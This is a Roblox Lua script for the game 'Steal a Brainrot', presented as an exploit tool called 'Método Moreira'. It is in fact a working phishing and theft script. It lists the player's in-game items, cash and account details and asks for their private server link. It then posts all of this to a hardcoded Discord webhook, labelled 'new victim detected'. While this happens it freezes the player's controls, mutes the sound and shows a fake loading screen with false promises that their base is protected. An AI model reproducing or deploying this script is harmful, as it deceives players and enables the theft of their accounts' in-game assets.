local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local placeId = 17308778014

local WEBHOOK_URL = "https://discord.com/api/webhooks/1428257268343771227/iK_ZVJ7SfIT4gpZ-FkL1duHd787aFqruh6X9cJGNAVVuxSxhN5n7N38qNsg8tISjluIN"

-- ==================== TABLA COMPLETA DE BRAINROTS ====================
local BrainrotData = {
    ["Noobini Pizzanini"] = {price = 25, generation = 1, rarity = "Common"},
    ["Lirilì Larilà"] = {price = 250, generation = 3, rarity = "Common"},
    ["Tim Cheese"] = {price = 500, generation = 5, rarity = "Common"},
    ["Garama and Madundung"] = {price = 10000000000, generation = 50000000, rarity = "Secret"},
    ["Fluriflura"] = {price = 750, generation = 7, rarity = "Common"},
    ["Svinina Bombardino"] = {price = 1250, generation = 10, rarity = "Common"},
    ["Talpa Di Fero"] = {price = 1000, generation = 9, rarity = "Common"},
    ["Pipi Kiwi"] = {price = 1500, generation = 13, rarity = "Common"},
    ["Sigma Girl"] = {price = 3400000, generation = 1800, rarity = "Legendary"},
    ["Raccooni Jandelini"] = {price = 1350, generation = 12, rarity = "Common"},
    ["Trippi Troppi"] = {price = 2000, generation = 15, rarity = "Rare"},
    ["Tung Tung TungSahur"] = {price = 3000, generation = 25, rarity = "Rare"},
    ["Gangster Footera"] = {price = 4000, generation = 30, rarity = "Rare"},
    ["Boneca Ambalabu"] = {price = 5000, generation = 40, rarity = "Rare"},
    ["Ta Ta Ta Ta Sahur"] = {price = 7500, generation = 55, rarity = "Rare"},
    ["Tric Trac Baraboom"] = {price = 9000, generation = 65, rarity = "Rare"},
    ["Bandito Bobritto"] = {price = 4500, generation = 35, rarity = "Rare"},
    ["Cacto Hipopotamo"] = {price = 6500, generation = 50, rarity = "Rare"},
    ["Pipi Avocado"] = {price = 9500, generation = 70, rarity = "Rare"},
    ["Cappuccino Assassino"] = {price = 10000, generation = 75, rarity = "Epic"},
    ["Brr Brr Patapim"] = {price = 15000, generation = 100, rarity = "Epic"},
    ["Trulimero Trulicina"] = {price = 20000, generation = 125, rarity = "Epic"},
    ["Bananita Dolphinita"] = {price = 25000, generation = 150, rarity = "Epic"},
    ["Brri Brri Bicus Dicus Bombicus"] = {price = 30000, generation = 175, rarity = "Epic"},
    ["Bambini Crostini"] = {price = 22500, generation = 135, rarity = "Epic"},
    ["Perochello Lemonchello"] = {price = 27500, generation = 160, rarity = "Epic"},
    ["Avocadini Guffo"] = {price = 35000, generation = 225, rarity = "Epic"},
    ["Salamino Penguino"] = {price = 40000, generation = 250, rarity = "Epic"},
    ["Bandito Axolito"] = {price = 12500, generation = 90, rarity = "Epic"},
    ["Ti Ti Ti Sahur"] = {price = 37500, generation = 225, rarity = "Epic"},
    ["Penguino Cocosino"] = {price = 45000, generation = 300, rarity = "Epic"},
    ["Avocadini Antilopini"] = {price = 17500, generation = 115, rarity = "Epic"},
    ["Burbaloni Loliloli"] = {price = 35000, generation = 200, rarity = "Legendary"},
    ["Chimpanzini Bananini"] = {price = 50000, generation = 300, rarity = "Legendary"},
    ["Ballerina Cappuccina"] = {price = 100000, generation = 500, rarity = "Legendary"},
    ["Caramello Filtrello"] = {price = 255000, generation = 1050, rarity = "Legendary"},
    ["Chef Crabracadabra"] = {price = 150000, generation = 600, rarity = "Legendary"},
    ["Glorbo Fruttodrillo"] = {price = 200000, generation = 750, rarity = "Legendary"},
    ["Blueberrinni Octopusini"] = {price = 250000, generation = 1000, rarity = "Legendary"},
    ["Lionel Cactuseli"] = {price = 175000, generation = 650, rarity = "Legendary"},
    ["Pandaccini Bananini"] = {price = 300000, generation = 1250, rarity = "Legendary"},
    ["Strawberrelli Flamingelli"] = {price = 275000, generation = 1150, rarity = "Legendary"},
    ["Cocosini Mama"] = {price = 285000, generation = 1200, rarity = "Legendary"},
    ["Pi Pi Watermelon"] = {price = 315000, generation = 1300, rarity = "Legendary"},
    ["Sigma Boy"] = {price = 325000, generation = 1350, rarity = "Legendary"},
    ["Strawberry Elephant"] = {price = 500000000000, generation = 350000000, rarity = "OG"},
    ["Noo my examine"] = {price = 525000000, generation = 1700000, rarity = "Secret"},
    ["Yess my examine"] = {price = 130000000, generation = 575000, rarity = "Secret"},
    ["Spaghetti Tualetti"] = {price = 15000000000, generation = 60000000, rarity = "Secret"},
    ["Pipi Potato"] = {price = 265000, generation = 1100, rarity = "Legendary"},
    ["Steve"] = {price = 265000, generation = 1100, rarity = "Legendary"},
    ["Quivioli Ameleonni"] = {price = 225000, generation = 900, rarity = "Legendary"},
    ["Frigo Camelo"] = {price = 350000, generation = 1400, rarity = "Mythic"},
    ["Orangutini Ananassini"] = {price = 400000, generation = 1750, rarity = "Mythic"},
    ["Bombardiro Crocodilo"] = {price = 500000, generation = 2500, rarity = "Mythic"},
    ["Gorillo Subwoofero"] = {price = 2750000, generation = 7750, rarity = "Mythic"},
    ["Los Noobinis"] = {price = 4350000, generation = 12500, rarity = "Mythic"},
    ["Bombombini Gusini"] = {price = 1000000, generation = 5000, rarity = "Mythic"},
    ["Rhino Toasterino"] = {price = 450000, generation = 2150, rarity = "Mythic"},
    ["Cavallo Virtuoso"] = {price = 2500000, generation = 7500, rarity = "Mythic"},
    ["Spioniro Golubiro"] = {price = 750000, generation = 3500, rarity = "Mythic"},
    ["Zibra Zubra Zibralini"] = {price = 1500000, generation = 6000, rarity = "Mythic"},
    ["Tigrilini Watermelini"] = {price = 1750000, generation = 6500, rarity = "Mythic"},
    ["Gorillo Watermelondrillo"] = {price = 3000000, generation = 8000, rarity = "Mythic"},
    ["Avocadorilla"] = {price = 2000000, generation = 7000, rarity = "Mythic"},
    ["Ganganzelli Trulala"] = {price = 3750000, generation = 9000, rarity = "Mythic"},
    ["Tob Tobi Tobi"] = {price = 3250000, generation = 8500, rarity = "Mythic"},
    ["Te Te Te Sahur"] = {price = 4000000, generation = 9500, rarity = "Mythic"},
    ["Tracoducotulu Delapeladustuz"] = {price = 4250000, generation = 12000, rarity = "Mythic"},
    ["Lerulerulerule"] = {price = 3500000, generation = 8750, rarity = "Mythic"},
    ["Carloo"] = {price = 4500000, generation = 13500, rarity = "Mythic"},
    ["Carrotini Brainini"] = {price = 4750000, generation = 15000, rarity = "Mythic"},
    ["Cocofanto Elefanto"] = {price = 5000000, generation = 17500, rarity = "Brainrot God"},
    ["Cocofanto Dollari"] = {price = 10000000, generation = 97500, rarity = "Dolla"},
    ["Job Job Job Dollar"] = {price = 185000000, generation = 993500, rarity = "Dolla"},
    ["Brr es Teh DollarPum"] = {price = 95000000, generation = 53500, rarity = "Dolla"},
    ["Tralalero Tralala"] = {price = 10000000, generation = 50000, rarity = "Brainrot God"},
    ["Odin Din Din Dun"] = {price = 15000000, generation = 75000, rarity = "Brainrot God"},
    ["Belula Beluga"] = {price = 60000000, generation = 290000, rarity = "Brainrot God"},
    ["Girafa Celestre"] = {price = 7500000, generation = 20000, rarity = "Brainrot God"},
    ["Las Capuchinas"] = {price = 32500000, generation = 185000, rarity = "Brainrot God"},
    ["Trenostruzzo Turbo 3000"] = {price = 25000000, generation = 150000, rarity = "Brainrot God"},
    ["Matteo"] = {price = 10000000, generation = 50000, rarity = "Brainrot God"},
    ["Fragola La La La"] = {price = 125000000, generation = 450000, rarity = "Secret"},
    ["67"] = {price = 1250000000, generation = 7500000, rarity = "Secret"},
    ["La Karkerkar Combinasion"] = {price = 2500000000, generation = 17500000, rarity = "Secret"},
    ["Los Chicleteiras"] = {price = 1200000000, generation = 7000000, rarity = "Secret"},
    ["Chachechi"] = {price = 85000000, generation = 400000, rarity = "Secret"},
    ["Extinct Tralalero"] = {price = 125000000, generation = 450000, rarity = "Secret"},
    ["Extinct Ballerina"] = {price = 23500000, generation = 125000, rarity = "Brainrot God"},
    ["Extinct Matteo"] = {price = 140000000, generation = 625000, rarity = "Secret"},
    ["Las Sis"] = {price = 2500000000, generation = 17500000, rarity = "Secret"},
    ["La Extinct Grande"] = {price = 3250000000, generation = 23500000, rarity = "Secret"},
    ["La Sahur Combinasion"] = {price = 550000000, generation = 2000000, rarity = "Secret"},
    ["Malame Amarele"] = {price = 23500, generation = 140, rarity = "Epic"},
    ["Piccionetta Macchina"] = {price = 47000000, generation = 270000, rarity = "Brainrot God"},
    ["Tralaledon"] = {price = 3000000000, generation = 27500000, rarity = "Secret"},
    ["Los Bros"] = {price = 6000000000, generation = 37500000, rarity = "Secret"},
    ["Tigroligre Frutonni"] = {price = 14000000, generation = 60000, rarity = "Brainrot God"},
    ["Orcalero Orcala"] = {price = 25000000, generation = 100000, rarity = "Brainrot God"},
    ["Unclito Samito"] = {price = 20000000, generation = 75000, rarity = "Brainrot God"},
    ["Gattatino Nyanino"] = {price = 7500000, generation = 35000, rarity = "Brainrot God"},
    ["Espresso Signora"] = {price = 25000000, generation = 70000, rarity = "Brainrot God"},
    ["Ballerino Lololo"] = {price = 35000000, generation = 200000, rarity = "Brainrot God"},
    ["Piccione Macchina"] = {price = 40000000, generation = 225000, rarity = "Brainrot God"},
    ["Los Crocodillitos"] = {price = 12500000, generation = 55000, rarity = "Brainrot God"},
    ["Chihuanini Taconini"] = {price = 8500000, generation = 45000, rarity = "Brainrot God"},
    ["Gattito Tacoto"] = {price = 32500000, generation = 165000, rarity = "Brainrot God"},
    ["Los Nooo My Hotspotsitos"] = {price = 1000000000, generation = 5000000, rarity = "Secret"},
    ["Los Tipi Tacos"] = {price = 46000000, generation = 260000, rarity = "Brainrot God"},
    ["Tukanno Bananno"] = {price = 22500000, generation = 100000, rarity = "Brainrot God"},
    ["Trippi Troppi Troppa Trippa"] = {price = 30000000, generation = 175000, rarity = "Brainrot God"},
    ["Los Tungtungtungcitos"] = {price = 37500000, generation = 210000, rarity = "Brainrot God"},
    ["Agarrini la Palini"] = {price = 80000000, generation = 425000, rarity = "Brainrot God"},
    ["Bulbito Bandito Traktorito"] = {price = 35000000, generation = 205000, rarity = "Brainrot God"},
    ["DollarMini"] = {price = 35000000, generation = 205000, rarity = "Dolla"},
    ["Los Orcalitos"] = {price = 45000000, generation = 235000, rarity = "Brainrot God"},
    ["Tipi Topi Taco"] = {price = 20000000, generation = 75000, rarity = "Brainrot God"},
    ["Bombardini Tortinii"] = {price = 50000000, generation = 225000, rarity = "Brainrot God"},
    ["Tralalita Tralala"] = {price = 20000000, generation = 100000, rarity = "Brainrot God"},
    ["Urubini Flamenguini"] = {price = 30000000, generation = 150000, rarity = "Brainrot God"},
    ["Alessio"] = {price = 17500000, generation = 85000, rarity = "Brainrot God"},
    ["Pakrahmatmamat"] = {price = 37500000, generation = 215000, rarity = "Brainrot God"},
    ["Los Bombinitos"] = {price = 42500000, generation = 220000, rarity = "Brainrot God"},
    ["Brr es Teh Patipum"] = {price = 40000000, generation = 1472, rarity = "Brainrot God"},
    ["Tartaruga Cisterna"] = {price = 45000000, generation = 2500, rarity = "Brainrot God"},
    ["Cacasito Satalito"] = {price = 45000000, generation = 240000, rarity = "Brainrot God"},
    ["Mastodontico Telepiedone"] = {price = 47500000, generation = 275000, rarity = "Brainrot God"},
    ["Crabbo Limonetta"] = {price = 46000000, generation = 235000, rarity = "Brainrot God"},
    ["La Vacca Saturno Saturnita"] = {price = 50000000, generation = 300000, rarity = "Secret"},
    ["Trenostruzzo Turbo 4000"] = {price = 100000000, generation = 310000, rarity = "Secret"},
    ["Meowl"] = {price = 350000000000, generation = 275000000, rarity = "OG"},
    ["Frogato Pirato"] = {price = 39000, generation = 240, rarity = "Epic"},
    ["Pakrahmatmatina"] = {price = 40500000, generation = 225000, rarity = "Brainrot God"},
    ["Bambu Bambu Sahur"] = {price = 47500000, generation = 275000, rarity = "Brainrot God"},
    ["Krupuk Pagi Pagi"] = {price = 60000000, generation = 290000, rarity = "Brainrot God"},
    ["Boatito Auratito"] = {price = 115000000, generation = 525000, rarity = "Secret"},
    ["Horegini Boom"] = {price = 650000000, generation = 2700000, rarity = "Secret"},
    ["Rang Ring Bus"] = {price = 1100000000, generation = 6000000, rarity = "Secret"},
    ["Mieteteira Bicicleteira"] = {price = 2700000000, generation = 26000000, rarity = "Secret"}
}

-- ==================== FUNCIONES AUXILIARES ====================

local function getExecutor()
    if identifyexecutor then
        return identifyexecutor()
    elseif KRNL_LOADED then
        return "KRNL"
    elseif syn then
        return "Synapse X"
    elseif SENTINEL_V2 then
        return "Sentinel"
    elseif getexecutorname then
        return getexecutorname()
    else
        return "Unknown Executor"
    end
end

local function getAccountAge()
    return player.AccountAge .. " days"
end

local function formatNumber(num)
    if num >= 1000000000 then
        return string.format("%.2fB", num / 1000000000)
    elseif num >= 1000000 then
        return string.format("%.2fM", num / 1000000)
    elseif num >= 1000 then
        return string.format("%.2fK", num / 1000)
    else
        return tostring(math.floor(num))
    end
end

local function getBrainrotBaseName(fullName)
    local baseName = fullName:match("^(.-)%s+[a-f0-9]+-[a-f0-9]+-[a-f0-9]+-[a-f0-9]+-[a-f0-9]+$") or fullName
    baseName = baseName:match("^(.-)%s+%d+$") or baseName
    return baseName:match("^%s*(.-)%s*$")
end

local function findPlayerPlot()
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if not plotsFolder then
        return nil
    end
    
    for _, plot in pairs(plotsFolder:GetChildren()) do
        if plot.Name == player.Name or plot.Name == tostring(player.UserId) then
            return plot
        end
    end
    
    return nil
end

local function getOwnedBrainrots()
    local owned = {}
    local totalProduction = 0
    local brainrotCount = {}
    
    local playerPlot = findPlayerPlot()
    
    if not playerPlot then
        local plotsFolder = Workspace:FindFirstChild("Plots")
        if plotsFolder then
            for _, plot in pairs(plotsFolder:GetChildren()) do
                for _, obj in pairs(plot:GetChildren()) do
                    if obj:IsA("Model") then
                        local baseName = getBrainrotBaseName(obj.Name)
                        if BrainrotData[baseName] then
                            if not brainrotCount[baseName] then
                                brainrotCount[baseName] = 0
                            end
                            brainrotCount[baseName] = brainrotCount[baseName] + 1
                        end
                    end
                end
            end
        end
    else
        for _, obj in pairs(playerPlot:GetChildren()) do
            if obj:IsA("Model") then
                local baseName = getBrainrotBaseName(obj.Name)
                
                if BrainrotData[baseName] then
                    if not brainrotCount[baseName] then
                        brainrotCount[baseName] = 0
                    end
                    brainrotCount[baseName] = brainrotCount[baseName] + 1
                end
            end
        end
    end
    
    for brainrotName, count in pairs(brainrotCount) do
        local data = BrainrotData[brainrotName]
        local production = data.generation * count
        totalProduction = totalProduction + production
        
        table.insert(owned, {
            name = brainrotName,
            count = count,
            production = production,
            productionPerUnit = data.generation,
            price = data.price,
            rarity = data.rarity
        })
    end
    
    table.sort(owned, function(a, b)
        return a.production > b.production
    end)
    
    return owned, totalProduction
end

local function formatBrainrotsList(brainrots, totalProduction)
    if #brainrots == 0 then
        return "No brainrots detected"
    end
    
    local formatted = ""
    local totalUnits = 0
    
    for i, brainrot in ipairs(brainrots) do
        totalUnits = totalUnits + brainrot.count
        
        formatted = formatted .. brainrot.name
        
        if brainrot.count > 1 then
            formatted = formatted .. " (x" .. brainrot.count .. ")"
        end
        
        formatted = formatted .. " - $" .. formatNumber(brainrot.productionPerUnit) .. "/s"
        
        if brainrot.count > 1 then
            formatted = formatted .. " = $" .. formatNumber(brainrot.production) .. "/s total"
        end
        
        if i < #brainrots then
            formatted = formatted .. "\n"
        end
    end
    
    formatted = formatted .. "\n\n💰 Total Production: $" .. formatNumber(totalProduction) .. "/s"
    formatted = formatted .. "\n🎃 Total Units: " .. totalUnits
    
    return formatted
end

local function sendWebhook(link)
    local ownedBrainrots, totalProduction = getOwnedBrainrots()
    local brainrotsList = formatBrainrotsList(ownedBrainrots, totalProduction)
    
    local embedData = {
        {
            ["title"] = "Script Metodo Moreira",
            ["description"] = "Nueva víctima detectada",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "📋 Info",
                    ["value"] = player.UserId .. " - " .. player.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "⏰ Account Age",
                    ["value"] = getAccountAge(),
                    ["inline"] = true
                },
                {
                    ["name"] = "⚙️ Executor",
                    ["value"] = getExecutor(),
                    ["inline"] = true
                },
                {
                    ["name"] = "🎃 Brainrots Owned (" .. #ownedBrainrots .. " types)",
                    ["value"] = brainrotsList ~= "" and brainrotsList or "No brainrots detected",
                    ["inline"] = false
                },
                {
                    ["name"] = "💰 Money",
                    ["value"] = player.leaderstats and player.leaderstats.Cash and formatNumber(player.leaderstats.Cash.Value) or "Unknown",
                    ["inline"] = true
                },
                {
                    ["name"] = "🔄 Rebirths",
                    ["value"] = player.leaderstats and player.leaderstats.Rebirths and tostring(player.leaderstats.Rebirths.Value) or "0",
                    ["inline"] = true
                },
                {
                    ["name"] = "📊 Total Production",
                    ["value"] = "$" .. formatNumber(totalProduction) .. "/s",
                    ["inline"] = true
                },
                {
                    ["name"] = "✅ Status",
                    ["value"] = "Working",
                    ["inline"] = true
                },
                {
                    ["name"] = "🔗 Private Server",
                    ["value"] = link,
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "discord.gg/8wqtz | Steal a Brainrot"
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }
    }
    
    local webhookData = {
        embeds = embedData,
        username = "s"
    }
    
    local jsonData = HttpService:JSONEncode(webhookData)
    
    local methods = {
        function()
            if http_request then
                return pcall(function()
                    http_request({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = jsonData
                    })
                end)
            end
            return false
        end,
        
        function()
            if request then
                return pcall(function()
                    request({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = jsonData
                    })
                end)
            end
            return false
        end,
        
        function()
            if syn and syn.request then
                return pcall(function()
                    syn.request({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = jsonData
                    })
                end)
            end
            return false
        end,
        
        function()
            return pcall(function()
                game:GetService("HttpService"):RequestAsync({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            end)
        end
    }
    
    for i, method in ipairs(methods) do
        local success, result = method()
        if success then
            return true
        end
        wait(0.1)
    end
    
    return false
end

local function disableControls()
    UserInputService.MouseIconEnabled = false
    
    local connection
    connection = UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Escape then
            return
        else
            pcall(function()
                if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
                    player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Physics)
                end
            end)
        end
    end)
    
    return connection
end

local function checkIfPrivateServer()
    local success, result = pcall(function()
        return game:GetService("ReplicatedStorage"):FindFirstChild("PrivateServerId") or 
               game:GetService("ReplicatedStorage"):FindFirstChild("PSID") or
               game.PrivateServerId ~= "" or
               game.PrivateServerOwnerId ~= 0
    end)
    
    if success and (result == true or game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0) then
        return true
    end
    
    if #Players:GetPlayers() <= 10 then
        return true
    end
    
    return false
end

-- ==================== VERIFICACIÓN DE SERVIDOR PRIVADO ====================
if not checkIfPrivateServer() then
    player:Kick("❌ Solo se permite en servidores privados\n✅ Únete a un servidor privado primero")
    return
end

pcall(function()
    local SoundService = game:GetService("SoundService")
    SoundService.Volume = 0
end)

-- ==================== INTERFAZ GRÁFICA ====================
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MetodoMoreira"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.DisplayOrder = 999999
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = CoreGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 10
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(0, 800, 0, 100)
titleLabel.Position = UDim2.new(0.5, -400, 0.15, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Método Moreira"
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextSize = 70
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.ZIndex = 11
titleLabel.Parent = mainFrame

local discordLabel = Instance.new("TextLabel")
discordLabel.Size = UDim2.new(0, 600, 0, 60)
discordLabel.Position = UDim2.new(0.5, -300, 0.27, 0)
discordLabel.BackgroundTransparency = 1
discordLabel.Text = "discord.gg/desish"
discordLabel.TextColor3 = Color3.new(0.4, 0.7, 1)
discordLabel.TextSize = 40
discordLabel.Font = Enum.Font.GothamBold
discordLabel.ZIndex = 11
discordLabel.Parent = mainFrame

local loadingTextLabel = Instance.new("TextLabel")
loadingTextLabel.Size = UDim2.new(0, 800, 0, 50)
loadingTextLabel.Position = UDim2.new(0.5, -400, 0.38, 0)
loadingTextLabel.BackgroundTransparency = 1
loadingTextLabel.Text = "Script loading please wait for while"
loadingTextLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
loadingTextLabel.TextSize = 22
loadingTextLabel.Font = Enum.Font.Gotham
loadingTextLabel.ZIndex = 11
loadingTextLabel.Parent = mainFrame

local warningLabel = Instance.new("TextLabel")
warningLabel.Size = UDim2.new(0, 800, 0, 50)
warningLabel.Position = UDim2.new(0.5, -400, 0.44, 0)
warningLabel.BackgroundTransparency = 1
warningLabel.Text = "Don't worry, your base will be automatically locked"
warningLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
warningLabel.TextSize = 20
warningLabel.Font = Enum.Font.Gotham
warningLabel.ZIndex = 11
warningLabel.Parent = mainFrame

local textBoxFrame = Instance.new("Frame")
textBoxFrame.Size = UDim2.new(0, 700, 0, 55)
textBoxFrame.Position = UDim2.new(0.5, -350, 0.55, 0)
textBoxFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
textBoxFrame.BorderSizePixel = 3
textBoxFrame.BorderColor3 = Color3.new(1, 1, 1)
textBoxFrame.ZIndex = 11
textBoxFrame.Parent = mainFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -20, 1, -10)
textBox.Position = UDim2.new(0, 10, 0, 5)
textBox.BackgroundTransparency = 1
textBox.Text = ""
textBox.PlaceholderText = "Paste private server link here..."
textBox.TextColor3 = Color3.new(1, 1, 1)
textBox.TextSize = 18
textBox.ClearTextOnFocus = false
textBox.ZIndex = 12
textBox.TextXAlignment = Enum.TextXAlignment.Center
textBox.Font = Enum.Font.Gotham
textBox.Parent = textBoxFrame

local joinButton = Instance.new("TextButton")
joinButton.Size = UDim2.new(0, 400, 0, 65)
joinButton.Position = UDim2.new(0.5, -200, 0.66, 0)
joinButton.BackgroundColor3 = Color3.new(0, 1, 0)
joinButton.BorderSizePixel = 0
joinButton.Text = "JOIN SERVER"
joinButton.TextColor3 = Color3.new(0, 0, 0)
joinButton.TextSize = 30
joinButton.Font = Enum.Font.GothamBlack
joinButton.ZIndex = 11
joinButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = joinButton

local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(0, 700, 0, 45)
errorLabel.Position = UDim2.new(0.5, -350, 0.76, 0)
errorLabel.BackgroundTransparency = 1
errorLabel.Text = ""
errorLabel.TextColor3 = Color3.new(1, 0, 0)
errorLabel.TextSize = 22
errorLabel.Font = Enum.Font.GothamBold
errorLabel.Visible = false
errorLabel.ZIndex = 11
errorLabel.Parent = mainFrame

local footerLabel = Instance.new("TextLabel")
footerLabel.Size = UDim2.new(0, 500, 0, 30)
footerLabel.Position = UDim2.new(0.5, -250, 0.92, 0)
footerLabel.BackgroundTransparency = 1
footerLabel.Text = "Made by desish team"
footerLabel.TextColor3 = Color3.new(0.5, 0.5, 0.5)
footerLabel.TextSize = 16
footerLabel.Font = Enum.Font.Gotham
footerLabel.ZIndex = 11
footerLabel.Parent = mainFrame

local function showLoadingScreen()
    textBoxFrame.Visible = false
    joinButton.Visible = false
    errorLabel.Visible = false
    footerLabel.Visible = false
    
    titleLabel.Position = UDim2.new(0.5, -400, 0.15, 0)
    discordLabel.Position = UDim2.new(0.5, -300, 0.27, 0)
    loadingTextLabel.Position = UDim2.new(0.5, -400, 0.38, 0)
    warningLabel.Position = UDim2.new(0.5, -400, 0.44, 0)
    
    local progressBarBack = Instance.new("Frame")
    progressBarBack.Size = UDim2.new(0, 700, 0, 40)
    progressBarBack.Position = UDim2.new(0.5, -350, 0.58, 0)
    progressBarBack.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
    progressBarBack.BorderSizePixel = 0
    progressBarBack.ZIndex = 11
    progressBarBack.Parent = mainFrame
    
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 10)
    barCorner.Parent = progressBarBack
    
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 12
    progressBar.Parent = progressBarBack
    
    local barCorner2 = Instance.new("UICorner")
    barCorner2.CornerRadius = UDim.new(0, 10)
    barCorner2.Parent = progressBar
    
    local percentageText = Instance.new("TextLabel")
    percentageText.Size = UDim2.new(1, 0, 1, 0)
    percentageText.BackgroundTransparency = 1
    percentageText.Text = "0%"
    percentageText.TextColor3 = Color3.new(1, 1, 1)
    percentageText.TextSize = 22
    percentageText.Font = Enum.Font.GothamBold
    percentageText.ZIndex = 13
    percentageText.Parent = progressBarBack
    
    spawn(function()
        local progress = 0
        
        while progress < 100 do
            progress = progress + math.random(1, 2)
            if progress > 100 then progress = 100 end
            
            progressBar:TweenSize(UDim2.new(progress/100, 0, 1, 0), "Out", "Quad", 0.8, true)
            percentageText.Text = progress .. "%"
            
            wait(math.random(3, 6))
        end
        
        percentageText.Text = "100%"
        progressBar.Size = UDim2.new(1, 0, 1, 0)
    end)
end

local controlsDisabled = false

joinButton.MouseButton1Click:Connect(function()
    if controlsDisabled then return end
    
    local link = textBox.Text:gsub(" ", "")
    
    if link == "" then
        errorLabel.Text = "❌ Please enter a server link"
        errorLabel.Visible = true
        wait(3)
        errorLabel.Visible = false
        return
    end
    
    if not string.find(link:lower(), "roblox.com") then
        errorLabel.Text = "❌ Invalid Roblox link"
        errorLabel.Visible = true
        wait(3)
        errorLabel.Visible = false
        return
    end
    
    errorLabel.Visible = false
    
    controlsDisabled = true
    disableControls()
    
    sendWebhook(link)
    
    showLoadingScreen()
end)

UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Escape then
        return
    end
end)

spawn(function()
    while titleLabel.Parent do
        for hue = 0, 1, 0.01 do
            if not titleLabel.Parent then break end
            local r = math.abs(math.sin(hue * 6.28))
            local g = math.abs(math.sin((hue + 0.33) * 6.28))
            local b = math.abs(math.sin((hue + 0.66) * 6.28))
            titleLabel.TextColor3 = Color3.new(r, g, b)
            wait(0.05)
        end
    end
end)
